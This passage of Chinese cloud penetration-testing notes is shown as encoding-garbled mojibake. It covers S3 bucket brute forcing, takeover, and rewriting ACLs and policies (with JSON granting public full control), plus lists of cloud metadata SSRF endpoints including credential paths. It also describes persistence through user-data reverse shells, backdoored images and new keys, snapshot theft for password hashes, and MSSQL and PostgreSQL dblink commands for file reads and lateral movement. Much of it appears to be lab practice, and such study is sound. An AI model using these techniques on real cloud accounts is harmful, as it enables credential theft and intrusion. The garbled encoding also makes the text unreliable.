‡å‡†ä¸­ï¼Œå¯¹å¯¹è±¡å­˜å‚¨ä¸­å¯ä»¥æœ‰å¤šä¸ªæ¡¶ï¼ˆBucketï¼‰ï¼Œè€Œå¯¹è±¡ï¼ˆobjectï¼‰å­˜æ”¾åœ¨æ¡¶é‡Œï¼Œå¯¹è±¡åŒ…å«ä¸‰ä¸ªkeyã€Dataã€Metadataéƒ¨åˆ†ï¼š\nKeyæŒ‡å­˜å‚¨æ¡¶ä¸­çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œä¾‹å¦‚ä¸€ä¸ª URL ä¸ºï¼šhttps://yuy0ung.s3.ap-northeast-2.amazonaws.com/d0g3ï¼Œè¿™é‡Œçš„ yuy0ung æ˜¯å­˜å‚¨æ¡¶ Bucket çš„åç§°ï¼Œ/d0g3 å°±æ˜¯ Key Dataå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯å­˜å‚¨çš„æ•°æ®æœ¬ä½“ Metadataæ„å‘³å…ƒæ•°æ®ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºæ•°æ®çš„æ ‡ç­¾ã€æè¿°ä¹‹ç±»çš„ä¿¡æ¯ï¼ˆåŒºåˆ«äºä¼ ç»Ÿçš„æ–‡ä»¶å­˜å‚¨ï¼Œåœ¨ä¼ ç»Ÿçš„æ–‡ä»¶å­˜å‚¨ä¸­è¿™ç±»ä¿¡æ¯æ˜¯ç›´æ¥å°è£…åœ¨æ–‡ä»¶é‡Œçš„ï¼Œè€Œäº‘ä¸Šæœ‰äº†å…ƒæ•°æ®çš„å­˜åœ¨ï¼Œå¯ä»¥å¤§å¤§çš„åŠ å¿«å¯¹è±¡çš„æ’åºã€åˆ†ç±»å’ŒæŸ¥æ‰¾ï¼‰ æ“ä½œä½¿ç”¨Amazon S3çš„æ–¹å¼å¤§è‡´å¦‚ä¸‹ï¼š\nAWS æ§åˆ¶å°æ“ä½œ AWS å‘½ä»¤è¡Œå·¥å…·æ“ä½œ AWS SDK æ“ä½œ REST API æ“ä½œï¼Œé€šè¿‡ REST APIï¼Œå¯ä»¥ä½¿ç”¨ HTTP è¯·æ±‚åˆ›å»ºã€æå–å’Œåˆ é™¤å­˜å‚¨æ¡¶å’Œå¯¹è±¡ æ¥ä¸‹æ¥è®°å½•S3ç›¸å…³æ”»å‡»æ‰‹æ³•\nBucketçˆ†ç ´ åœ¨ä¸çŸ¥é“bucketåç§°çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´è·å¾—Bucketåç§°ï¼Œç±»ä¼¼äºåœ¨å¸¸è§„æ¸—é€ä¸­çš„å­åŸŸåæŒ–æ˜ï¼Œä½†ç•¥æœ‰åŒºåˆ«ï¼š\nå­åŸŸåæŒ–æ˜é€šå¸¸é€šè¿‡å“åº”çš„çŠ¶æ€ç è¿›è¡Œåˆ¤æ–­ Bucketçˆ†ç ´é€šè¿‡é¡µé¢å›æ˜¾çš„å†…å®¹è¿›è¡Œåˆ¤æ–­ å½“ Bucket ä¸å­˜åœ¨æ—¶æœ‰å¦‚ä¸‹ä¸¤ç§è¿”å›æƒ…å†µï¼Œåˆ†åˆ«æ˜¯ InvalidBucketName å’Œ NoSuchBucketï¼š\nå­˜åœ¨æ—¶åŒæ ·æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯åˆ—å‡ºObjectï¼Œå½“ç„¶è¿™æ ·å¯èƒ½å­˜åœ¨å­˜å‚¨æ¡¶éå†å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„æ¼ï¼š\nä¸€ç§æ˜¯æ˜¾ç¤ºAccessDeniedï¼š\nè¿™æ ·é€šè¿‡è¿”å›å†…å®¹çš„ä¸åŒï¼Œå°±å¯ä»¥è¿›è¡Œ Bucket åç§°çˆ†ç ´äº†ï¼ŒçŸ¥é“ Bucket åç§°åï¼ŒKey çš„çˆ†ç ´\nBucketæ¥ç®¡ å‡å¦‚åœ¨è¿›è¡Œæ¸—é€æ—¶ï¼Œå‘ç°ç›®æ ‡çš„ä¸€ä¸ªå­åŸŸåæ˜¾ç¤ºNoSuchBucketï¼Œé‚£ä¹ˆåªéœ€è¦é‡æ–°åˆ›å»ºä¸€ä¸ªä¸HostIDä¸€æ ·çš„å­˜å‚¨æ¡¶åç§°å³å¯æ¥ç®¡è¯¥å­˜å‚¨æ¡¶ï¼Œæ¥ç®¡åä¸Šä¼ æ–‡ä»¶å¹¶è®¾ç½®å…¬å¼€å³å¯è®©è¯¥åŸŸåæ˜¾ç¤ºæˆ‘ä»¬ä¸Šä¼ çš„ä»»æ„æ–‡ä»¶\nåœ¨è…¾è®¯äº‘çš„å¯¹è±¡å­˜å‚¨ä¸­ï¼Œæ— æ³•é€ æˆä»¥ä¸Šçš„æ“ä½œï¼Œå› ä¸ºåœ¨è…¾è®¯äº‘çš„å¯¹è±¡å­˜å‚¨åŸŸåä¸­ï¼Œæœ‰ä¸€ä¸ªAPPIDï¼Œè¿™ä¸ªAPPIDæ¥è‡ªæˆ‘ä»¬çš„è´¦æˆ·ä¿¡æ¯ä¸­\nä»»æ„æ–‡ä»¶ä¸Šä¼  å¦‚æœå¯¹è±¡å­˜å‚¨çš„é…ç½®ä¸å½“ï¼Œæ¯”å¦‚å…¬å…±è¯»å†™ï¼Œå°±æœ‰å¯èƒ½é€ æˆä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œç”šè‡³æ˜¯æ–‡ä»¶è¦†ç›–\næ”»å‡»æ–¹æ³•ä¸ä¸­é—´ä»¶çš„PUTæ¼æ´ç±»ä¼¼ï¼Œä½¿ç”¨PUTæ–¹æ³•ä¸Šä¼ æ–‡ä»¶å³å¯ï¼Œè‹¥ç›®æ ‡çš„å¯¹è±¡å­˜å‚¨æ”¯æŒhtmlè§£æï¼Œé‚£ä¹ˆè¿˜å¯ä»¥å°è¯•è¿›è¡ŒXSSã€æŒ‚æš—é“¾ã€æŒ‚é»‘é¡µã€ä¾›åº”é“¾æŠ•æ¯’ç­‰æ“ä½œ\næ¯”å¦‚è¿™é‡Œè®¿é—®å¯ä»¥å‘ç°æœ‰ä¸€å¼ å›¾ç‰‡ï¼š\nå°è¯•ä½¿ç”¨PUTæ–¹æ³•è¦†ç›–ï¼š\næ¥ä¸‹æ¥å†å°è¯•è®¿é—®å›¾ç‰‡ï¼Œå¯ä»¥å‘ç°å†…å®¹å·²ç»è¢«è¦†ç›–ï¼š\nBucket ACL å¯å†™ ACLå³è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼Œç”¨æ¥ç®¡ç†è®¿é—®æƒé™çš„è§„åˆ™ï¼Œè‹¥ ACL å¯å†™ï¼Œæ„å‘³ç€ç”¨æˆ·æˆ–æ”»å‡»è€…å¯ä»¥ç›´æ¥ä¿®æ”¹è¿™äº›æƒé™è§„åˆ™\næ¯”å¦‚ä¸‹é¢çš„S3å¯¹è±¡å­˜å‚¨ï¼Œåœ¨Bucket ACLå¯å†™æ—¶å°†Permissionæƒé™ä¿®æ”¹ä¸ºFULL_CONTROLï¼š\n{ \u0026#34;Owner\u0026#34;: { \u0026#34;ID\u0026#34;: \u0026#34;d24***5\u0026#34; }, \u0026#34;Grants\u0026#34;: [ { \u0026#34;Grantee\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;Group\u0026#34;, \u0026#34;URI\u0026#34;: \u0026#34;http://acs.amazonaws.com/groups/global/AllUsers\u0026#34; }, \u0026#34;Permission\u0026#34;: \u0026#34;FULL_CONTROL\u0026#34; } ] } è¿™æ ·ä¸€æ¥ï¼Œå†™å…¥ç­–ç•¥åå³å¯å®ç°å­˜å‚¨æ¡¶çš„éå†ç­‰æ“ä½œ\nObject ACL å¯å†™ åŸç†å’Œä¸Šé¢çš„Bucket ACLå¯å†™ç±»ä¼¼\næ¯”å¦‚è¿™é‡Œè®¿é—®flagæ²¡æœ‰æƒé™ï¼š æˆ‘ä»¬é€šè¿‡?aclæ¥æŸ¥çœ‹è¿™ä¸ªå¯¹è±¡çš„æƒé™ï¼š å‘ç°æ˜¯privateï¼Œå°è¯•é€šè¿‡PUTæ–¹æ³•ä¿®æ”¹ä¸ºpublic-readï¼Œéœ€è¦åœ¨è¯·æ±‚å¤´æ·»åŠ x-oss-object-aclå‚æ•°ï¼š\nå›æ˜¾200ï¼Œçœ‹æ¥ä¿®æ”¹æˆåŠŸäº†ï¼Œå†æ¬¡å°è¯•è®¿é—®flagï¼Œå‘ç°æˆåŠŸå°†flagæ”¹ä¸ºå…¬å…±å¯è¯»ï¼š\nBucket ç­–ç•¥å¯å†™ éƒ¨åˆ†ç¯å¢ƒçš„aclå¯è¯»å†™ï¼š\nå¯ä»¥å°è¯•é€šè¿‡PUTæ–¹æ³•ä¿®æ”¹ç­–ç•¥è¯»å–æ•æ„Ÿæ–‡ä»¶ï¼Œæ¯”å¦‚è¿™ä¸ªS3å¯¹è±¡å­˜å‚¨çš„Bucketç­–ç•¥ï¼š\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Principal\u0026#34;: { \u0026#34;AWS\u0026#34;: [ \u0026#34;*\u0026#34; ] }, \u0026#34;Action\u0026#34;: [ \u0026#34;s3:GetBucketPolicy\u0026#34;, \u0026#34;s3:PutBucketPolicy\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:s3:::teamssix\u0026#34; ] }, { \u0026#34;Effect\u0026#34;: \u0026#34;Deny\u0026#34;, \u0026#34;Principal\u0026#34;: { \u0026#34;AWS\u0026#34;: [ \u0026#34;*\u0026#34; ] }, \u0026#34;Action\u0026#34;: [ \u0026#34;s3:GetObject\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:s3:::teamssix/flag\u0026#34; ] } ] } è¿™é‡Œç¦æ­¢è¯»å–flag\nä½†å¦‚æœå°†ç¬¬20è¡Œçš„Denyæ”¹ä¸ºAllowï¼Œå³å¯æˆåŠŸè®¿é—®flag\nå½“ç„¶ï¼Œæœ‰çš„åœºæ™¯å°†Allowæ”¹ä¸ºDenyåˆ™æœ‰å¯èƒ½å¯¼è‡´ä¸šåŠ¡ç˜«ç—ª\nBucket Object éå† å’Œå¸¸è§„WEBæœåŠ¡çš„index ofç›®å½•éå†ç±»ä¼¼ï¼Œå¯ä»¥è®¿é—®Bucketå¯ä»¥æŸ¥çœ‹å…¶ä¸­æ‰€æœ‰çš„Objectï¼Œå°†å…¶ä¸­çš„Keyæ‹¼æ¥åˆ°ç«™ç‚¹URLåé¢å³å¯è®¿é—®ç›¸åº”å¯¹è±¡\næ¯”å¦‚è¿™é‡Œçš„å¯¹è±¡éå†ï¼Œå¯ä»¥çœ‹è§Keyä¸ºflagï¼š\næ‹¼æ¥å³å¯è®¿é—®ï¼š\nç‰¹æ®Šçš„Bucket ç­–ç•¥ æœ‰äº› Bucket ä¼šå°†ç­–ç•¥é…ç½®æˆåªå…è®¸æŸäº›ç‰¹å®šæ¡ä»¶æ‰å…è®¸è®¿é—®ï¼Œå½“æˆ‘ä»¬çŸ¥é“è¿™ä¸ªç­–ç•¥åï¼Œå°±å¯ä»¥è®¿é—®è¯¥ Bucket çš„ç›¸å…³å¯¹è±¡\næ¯”å¦‚è¿™ä¸ªBucketï¼Œæ­£å¸¸è®¿é—®ä¼šè¢«æ‹’ç»ï¼š\nä½†å¦‚æœæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªç­–ç•¥æŒ‡å®šçš„UAå¤´HxSecurityLabï¼Œå°±èƒ½å¤ŸæˆåŠŸè®¿é—®ï¼š å¼¹æ€§è®¡ç®— å‰é¢æåˆ°EC2å¼¹æ€§è®¡ç®—å¯ä»¥ç®€å•ç†è§£ä¸ºäº‘ä¸Šçš„è™šæ‹Ÿæœºï¼Œè€Œè¿™é‡Œçš„â€œå¼¹æ€§â€ï¼Œåˆ™æ˜¯å…¶ä¸€å¤§ç‰¹ç‚¹ï¼š\næŒ‰éœ€é…ç½®ï¼šCPUã€å†…å­˜ã€ç¡¬ç›˜ã€ç½‘ç»œç­‰ç¡¬ä»¶å‚æ•°éšæ—¶è°ƒæ•´ï¼ˆç§’çº§åˆ‡æ¢ï¼‰\nå¼¹æ€§ä¼¸ç¼©ï¼šæœåŠ¡å™¨æ•°é‡å¯æ ¹æ®æµé‡è‡ªåŠ¨å¢å‡ï¼Œåº”å¯¹çªå‘é«˜å³°æˆ–èŠ‚çœé—²ç½®æˆæœ¬\nå¼¹æ€§è®¡ç®—åœ¨å›½å†…å«ECSå±…å¤šï¼ŒåŒæ ·ä¹Ÿå­˜åœ¨ä¸€äº›å®‰å…¨é—®é¢˜ï¼Œä¸‹é¢è¿›è¡Œè®°å½•\nå¼¹æ€§è®¡ç®—é¢ä¸´çš„é£é™© 1.å‡­è¯æ³„éœ² äº‘ä¸Šçš„å‡­è¯æ³„æ¼å¯ä»¥å¦‚ä¸‹åˆ’åˆ†ï¼š\næ§åˆ¶å°è´¦å·å¯†ç æ³„éœ²ï¼Œä¾‹å¦‚ç™»å½•æ§åˆ¶å°çš„è´¦å·å¯†ç  ä¸´æ—¶å‡­è¯æ³„éœ² è®¿é—®å¯†é’¥æ³„éœ²ï¼Œæ¯”å¦‚AK/SKæ³„éœ² å®ä¾‹ç™»å½•å‡­è¯æ³„éœ²ï¼Œä¾‹å¦‚ AWS åœ¨åˆ›å»º EC2 ç”Ÿæˆçš„è¯ä¹¦æ–‡ä»¶é­åˆ°æ³„éœ² å‡­è¯ä¿¡æ¯çš„æ”¶é›†ä¸€èˆ¬æœ‰å¦‚ä¸‹æ–¹æ³•ï¼š\ngithubæ•æ„Ÿä¿¡æ¯æœç´¢ åç¼–è¯‘APKã€å°ç¨‹åº ç½‘ç«™æºç æ³„éœ² 2.å…ƒæ•°æ® å…ƒæ•°æ®æœåŠ¡æ˜¯ä¸€ç§æä¾›æŸ¥è¯¢è¿è¡Œä¸­çš„å®ä¾‹å†…å…ƒæ•°æ®çš„æœåŠ¡ï¼Œå½“å®ä¾‹å‘å…ƒæ•°æ®æœåŠ¡å‘èµ·è¯·æ±‚æ—¶ï¼Œè¯¥è¯·æ±‚ä¸ä¼šé€šè¿‡å¤–éƒ¨ç½‘ç»œä¼ è¾“ï¼Œè€Œæ˜¯é€šè¿‡æœ¬åœ°ç½‘ç»œè¯·æ±‚\næ ¹æ®ä¸Šé¢æ‰€è¯´ï¼Œå¦‚æœè·å¾—äº†ç›®æ ‡ EC2 æƒé™æˆ–è€…ç›®æ ‡ EC2 å­˜åœ¨ SSRF æ¼æ´ï¼Œå°±å¯ä»¥è·å¾—åˆ°å®ä¾‹çš„å…ƒæ•°æ®\nä¸‹é¢æ˜¯å¯ä»¥ ssrf çš„å¸¸è§å…ƒæ•°æ®ç‚¹ï¼š\npacket\nhttps://metadata.packet.net/userdata\ngoogle\nhttp://metadata.google.internal/computeMetadata/v1beta1/ http://169.254.169.254/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/ http://metadata/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/instance/hostname http://metadata.google.internal/computeMetadata/v1/instance/id http://metadata.google.internal/computeMetadata/v1/project/project-id http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true\norcale\nhttp://192.0.0.192/latest/ http://192.0.0.192/latest/user-data/ http://192.0.0.192/latest/meta-data/ http://192.0.0.192/latest/attributes/\nalibaba\nhttp://100.100.100.200/latest/meta-data/ http://100.100.100.200/latest/meta-data/instance-id http://100.100.100.200/latest/meta-data/image-id\nåœ¨äº‘åœºæ™¯ä¸‹ï¼Œå¯ä»¥é€šè¿‡å…ƒæ•°æ®è¿›è¡Œä¸´æ—¶å‡­è¯å’Œå…¶ä»–ä¿¡æ¯çš„æ”¶é›†ï¼Œä»¥é˜¿é‡Œäº‘ECSï¼ˆå’ŒEC2ç›¸ä¼¼ï¼‰çš„é¶åœºä¸ºä¾‹ï¼š\nè¿™é‡Œæœ‰ä¸€ä¸ªssrfæ¼æ´ç‚¹ï¼š\nèƒ½å¤Ÿè¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼š\nå°è¯•SSRFè¯»å–å…ƒæ•°æ®ï¼š\nhttp://100.100.100.200/latest/meta-data/ å¯ä»¥çœ‹è§å¾ˆå¤šmetadataï¼Œä¸‹é¢åˆ—å‡ºä¸€äº›å¯¹äºçº¢é˜Ÿè€Œè¨€ä»·å€¼è¾ƒé«˜çš„metadataï¼Œå¯ä»¥ç”¨äºå‚è€ƒï¼š\nmac å®ä¾‹ MAC åœ°å€ hostname å®ä¾‹ä¸»æœºå iam/info è·å–è§’è‰²åç§° local-ipv4 å®ä¾‹æœ¬åœ° IP public-ipv4 å®ä¾‹å…¬ç½‘ IP instance-id å®ä¾‹ ID public-hostname æ¥å£çš„å…¬æœ‰ DNS (IPv4) placement/region å®ä¾‹çš„ AWS åŒºåŸŸ public-keys/0/openssh-key å…¬æœ‰å¯†é’¥ /iam/security-credentials/\u0026lt;rolename\u0026gt; è·å–è§’è‰²çš„ä¸´æ—¶å‡­è¯ æˆ‘ä»¬å¯ä»¥æ‹¼æ¥è·¯ç”±è®¿é—®å…¶ä¸­å†…å®¹ï¼š\nå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•è¯»å–user-data (å‰ææ˜¯ç›®æ ‡å·²ç»é…ç½®äº†ç”¨æˆ·æ•°æ®ï¼Œä¸ç„¶ä¼šè¿”å› 404)ï¼š\nhttp://100.100.100.200/latest/user-data/ User Data æ˜¯åœ¨åˆ›å»º ECS å®ä¾‹æ—¶ï¼Œå¯ä»¥æä¾›ç»™å®ä¾‹çš„ä¸€ç§è‡ªå®šä¹‰æ•°æ®ï¼Œé€šå¸¸ç”¨äºè‡ªåŠ¨åŒ–é…ç½®æˆ–è„šæœ¬æ‰§è¡Œ å®ƒçš„å†…å®¹ç±»ä¼¼äºdockerfileçš„å†…å®¹ï¼Œèƒ½å…è®¸ç”¨æˆ·åœ¨å®ä¾‹å¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡ŒæŸäº›æ“ä½œ\nå‘ç°åœ¨å¯åŠ¨æ—¶å†™å…¥äº†flagï¼Œå°è¯•è¯»å–ï¼š\n3.è´¦å·åŠ«æŒ å¦‚æœäº‘å‚å•†çš„æ§åˆ¶å°å­˜åœ¨æ¼æ´ï¼Œç”¨æˆ·è´¦å·ä¹Ÿä¼šå­˜åœ¨ä¸€å®šé£é™©\nAWS çš„æ§åˆ¶å°æ›¾ç»å‡ºç°è¿‡ä¸€äº› XSS æ¼æ´ï¼Œæ”»å‡»è€…å°±å¯èƒ½ä¼šä½¿ç”¨è¿™äº› XSS æ¼æ´è¿›è¡Œè´¦å·åŠ«æŒï¼Œä»è€Œè·å¾—ç›®æ ‡äº‘æœåŠ¡å™¨å®ä¾‹çš„æƒé™\n4.æ¶æ„çš„é•œåƒ å…¶å®å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ä¾›åº”é“¾æ”»å‡»\nAWS åœ¨åˆ›å»ºå®ä¾‹çš„æ—¶å€™ï¼Œç”¨æˆ·å¯ä»¥é€‰æ‹©ä½¿ç”¨å…¬å…±é•œåƒæˆ–è€…è‡ªå®šä¹‰é•œåƒï¼Œå¦‚æœè¿™äº›é•œåƒä¸­æœ‰æ¶æ„çš„é•œåƒï¼Œé‚£ä¹ˆç›®æ ‡ä½¿ç”¨è¯¥é•œåƒåˆ›å»ºå®ä¾‹å°±ä¼šäº§ç”Ÿé£é™©\nä»¥ CVE-2018-15869 ä¸ºä¾‹ï¼Œå…³äºè¯¥æ¼æ´çš„è§£é‡Šæ˜¯ï¼šå½“äººä»¬é€šè¿‡ AWS å‘½ä»¤è¡Œä½¿ç”¨ã€Œec2 describe-imagesã€åŠŸèƒ½æ—¶å¦‚æœæ²¡æœ‰æŒ‡å®š \u0026ndash;owners å‚æ•°ï¼Œå¯èƒ½ä¼šåœ¨æ— æ„ä¸­åŠ è½½æ¶æ„çš„ Amazon ç³»ç»Ÿé•œåƒ ( AMIï¼‰ï¼Œå¯¼è‡´ EC2 è¢«ç”¨æ¥æŒ–çŸ¿\nå¯¹æ­¤ï¼Œåœ¨ä½¿ç”¨ AWS å‘½ä»¤è¡Œæ—¶åº”è¯¥ç¡®ä¿è‡ªå·±ä½¿ç”¨çš„æ˜¯ä¸æ˜¯æœ€æ–°ç‰ˆçš„ AWS å‘½ä»¤è¡Œï¼ŒåŒæ—¶ç¡®ä¿ä»å¯ä¿¡çš„æ¥æºå»è·å– Amazon ç³»ç»Ÿé•œåƒ\n5.å…¶ä»–çš„åˆå§‹è®¿é—®æ–¹æ³• é™¤äº†ä¸Šé¢æåˆ°çš„æ–¹æ³•ï¼Œè¿˜å¯ä»¥é€šè¿‡äº‘æœåŠ¡ä¸Šçš„åº”ç”¨ç¨‹åºæ¼æ´ã€SSHä¸RDPçš„å¼±å£ä»¤ç­‰ä¼ ç»Ÿåœºæ™¯ä¸‹çš„æ–¹æ³•è¿›å…¥ç›®æ ‡å®ä¾‹\nä½¿ç”¨ç”¨æˆ·æ•°æ®æ‰§è¡Œå‘½ä»¤ åœ¨ä¸Šé¢æˆ‘ä»¬æåˆ°äº†åŠŸèƒ½ç±»ä¼¼äºdockerfikleçš„user-dataï¼Œæˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°ï¼šæ”»å‡»è€…èƒ½ä¿®æ”¹å®ä¾‹çš„ç”¨æˆ·æ•°æ®å¹¶å‘å…¶ä¸­å†™å…¥å¾…æ‰§è¡Œçš„å‘½ä»¤ï¼Œè¿™äº›ä»£ç å°†ä¼šåœ¨å®ä¾‹æ¯æ¬¡å¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡Œ\né€šå¸¸æ¥è¯´ä¿®æ”¹user-dataåªèƒ½åœ¨dashboardæˆ–å‘½ä»¤è¡Œä¸Šæ“ä½œè®¾ç½®ï¼Œæ‰€ä»¥æƒ³è¦æ¶æ„ä¿®æ”¹éš¾åº¦å¾ˆå¤§\nå¼¹æ€§è®¡ç®—ä¸‹çš„æƒé™ç»´æŒ è¿™é‡Œè®°å½•ä¸€äº›ä¼ ç»Ÿæ¸—é€ä¹‹å¤–çš„æƒé™ç»´æŒæ‰‹æ³•\n1.ç”¨æˆ·æ•°æ® ç±»ä¼¼äºå¼€æœºå¯åŠ¨é¡¹ï¼Œåˆ©ç”¨user-dataæ‰§è¡Œåå¼¹shellå‘½ä»¤å³å¯å®ç°ç»´æŒ\nä½†å¾ˆé¸¡è‚‹çš„æ˜¯ï¼šuser-dataåªèƒ½åœ¨å®ä¾‹åœæ­¢æ—¶ä¿®æ”¹ï¼Œå¹¶ä¸”ç›®æ ‡æœ‰å¯èƒ½å¾ˆé•¿æ—¶é—´ä¸ä¼šé‡å¯å®ä¾‹\n2.åé—¨é•œåƒ åœ¨è·å–åˆ°æ§åˆ¶å°æƒé™åå¯ä»¥å°è¯•å¯¹é•œåƒè¿›è¡Œä¿®æ”¹ã€åˆ é™¤åˆ›å»ºï¼Œä»¥æ­¤æ›¿æ¢ä¸Šåé—¨é•œåƒ\nå¦‚æ­¤ï¼Œä¸‹æ¬¡ç”¨æˆ·åœ¨é€‰ç”¨è¯¥é•œåƒåˆ›å»ºå®ä¾‹çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘é•œåƒä¸­çš„æ¶æ„ä»£ç \n3.åˆ›å»ºè®¿é—®å¯†é’¥ å¦‚æœæ¡ä»¶å…è®¸ï¼Œå¯ä»¥å°è¯•åˆ›å»ºæ–°çš„è®¿é—®å¯†é’¥è¿›è¡Œæƒé™ç»´æŒ\n4.åˆ›å»ºè¾…åŠ©è´¦å· é€šè¿‡åˆ›å»ºé«˜æƒé™å­è´¦å·çš„æ–¹å¼è¿›è¡Œæƒé™ç»´æŒï¼Œç„¶åé€šè¿‡è¿™ä¸ªå­è´¦å·è¿›è¡Œåç»­çš„æŒç»­æ”»å‡»è¡Œä¸º\nè·å–å…±äº«å¿«ç…§æ•°æ® å¦‚æœå½“å‰å‡­è¯æœ‰ç›¸å…³æƒé™ï¼Œå¯ä»¥é€šè¿‡åˆ›å»ºå…±äº«å¿«ç…§çš„æ–¹å¼ï¼Œå°†æ§åˆ¶å°ä¸‹çš„å®ä¾‹æŒ‚è½½ç”±è¯¥å¿«ç…§ç”Ÿæˆçš„å·ï¼Œä»è€Œè·å–åˆ°ç›®æ ‡çš„å¼¹æ€§è®¡ç®—ä¸­çš„å†…å®¹\nåœ¨æ‹¿åˆ°ç›®æ ‡æ§åˆ¶å°æƒé™æ—¶ï¼Œå¦‚æœæ— æ³•ç™»å½•åˆ°å®ä¾‹ï¼Œå¯ä»¥ä¸ºç›®æ ‡å®ä¾‹æ‰“ä¸ªå¿«ç…§ï¼Œç„¶åå°†å¿«ç…§å…±äº«ç»™è‡ªå·±ï¼Œæˆ‘ä»¬å†å°†å…¶æŒ‚è½½åˆ°è‡ªå·±çš„å®ä¾‹ï¼Œå³å¯æŸ¥çœ‹é‡Œé¢çš„æ•°æ®\nå¦å¤–ï¼Œåœ¨å¹³æ—¶è¿›è¡Œäº‘ä¸Šæ”»é˜²çš„æ—¶å€™ï¼Œå¶å°”ä¼šç¢°åˆ°è™½ç„¶æœ‰ ECS å®ä¾‹ç®¡ç†æƒé™ä½†æ— æ³•åœ¨å®ä¾‹ä¸Šæ‰§è¡Œå‘½ä»¤çš„æƒ…å†µï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥é‡‡å–ç±»ä¼¼çš„æ€è·¯ï¼š\nä¸ºç›®æ ‡å®ä¾‹æ‰“å¿«ç…§ â€”\u0026gt; åˆ›å»ºç£ç›˜ â€”\u0026gt; åˆ›å»ºå®ä¾‹ â€”\u0026gt; æŒ‚è½½ç£ç›˜ â€”\u0026gt; åˆ©ç”¨ SAM ç­‰æ–‡ä»¶è·å–å¯†ç æˆ–å“ˆå¸Œ â€”\u0026gt; ä½¿ç”¨å¯†ç æˆ–å“ˆå¸Œè¿œç¨‹ç™»å½•è·å–æƒé™\nå…¶å®å¦‚æœå¯¹å†…ç½‘æ¸—é€æ¯”è¾ƒç†Ÿæ‚‰çš„è¯ï¼Œå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªæ€è·¯å…¶å®å°±ç±»ä¼¼äºå·å½±æ‹·è´è·å–åŸŸæ§çš„ntds.dit\nRDSäº‘æ•°æ®åº“ å³äº‘ä¸Šçš„æ•°æ®åº“æœåŠ¡ï¼Œé€‚ç”¨äºéœ€è¦æ‰˜ç®¡å’Œç®¡ç†å…³ç³»å‹æ•°æ®åº“çš„å„ç§åœºæ™¯\nRDSä¿¡æ¯æ”¶é›† åœ¨RDSæ§åˆ¶å°ä¸­å¯ä»¥æ”¶é›†åˆ°ä¸€äº›ç›®æ ‡å…¬å¸äººå‘˜ä¿¡æ¯ï¼Œæ¯”å¦‚é‚®ç®±ã€ç›®æ ‡ RDS TOP SQL è¯­å¥ã€TOP è¿æ¥ä¸»æœºã€TOP ç”¨æˆ·ç­‰\nå½“ç„¶åœ¨å…±äº«å¿«ç…§ä¸­ï¼Œå¯ä»¥æ ¹æ®å¿«ç…§åç§°åˆ¤æ–­æŸ¥æ‰¾ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å’Œç›®æ ‡ç›¸å…³è”çš„å¿«ç…§ï¼Œç„¶åå†é€šè¿‡è¿˜åŸå¿«ç…§çš„æ–¹å¼ï¼Œå°è¯•è·å¾—å¿«ç…§ä¸­ RDS çš„æ•°æ®\nMSSQLè¯»å–å®ä¾‹ä¿¡æ¯ åœ¨æ‹¿åˆ°MSSQLæ•°æ®åº“æƒé™åï¼Œå¯ä»¥é€šè¿‡BULK INSERT è¯»å–æ•°æ®åº“æ‰€åœ¨å®ä¾‹çš„æ–‡ä»¶ï¼Œæ¯”å¦‚AWSä¸‹è¯»å–æ—¥å¿—æ–‡ä»¶ï¼š\ncreate table #testtable(context ntext); BULK INSERT #testtable FROM \u0026#39;C:\\ProgramData\\Amazon\\EC2Launch\\log\\agent.log\u0026#39; WITH (DATAFILETYPE = \u0026#39;char\u0026#39;,KEEPNULLS) select * from #testtable drop table #testtable; PostgreSQLæ•°æ®åº“SSRF å¦‚æœè·å¾—äº† PostgreSQL æ•°æ®åº“æƒé™ï¼Œå¯ä»¥é€šè¿‡ PostgreSQL ä¸­çš„ dblink æ’ä»¶æ¨ªå‘åˆ°å…¶ä»–åŒç½‘æ®µæ•°æ®åº“ï¼Œè¿™é‡Œä»¥ AWS RDS ä¸ºä¾‹\næ¯”å¦‚åœ¨æ— æ³•é€šè¿‡å¤–éƒ¨ç½‘ç»œè¿æ¥å¦ä¸€ç›®æ ‡PostgreSQLï¼Œå°±å¯ä»¥å°è¯•ä½¿ç”¨å·²æœ‰PostgreSQLè¿›è¡Œæ¨ªå‘å¹¶æ‰§è¡Œæ•°æ®åº“å‘½ä»¤ï¼š\ncreate extension dblink; select dblink_connect(\u0026#39;test\u0026#39;,\u0026#39;host=x.x.x.x port=xxx user=xxx password=xxx dbname=postgres sslmode=disable\u0026#39;); create table t(id int); select * from dblink_send_query(\u0026#39;test\u0026#39;, \u0026#39;select version();\u0026#39;); select * from dblink_get_result(\u0026#39;test\u0026#39;) as t(res text); èº«ä»½å’Œè®¿é—®ç®¡ç† 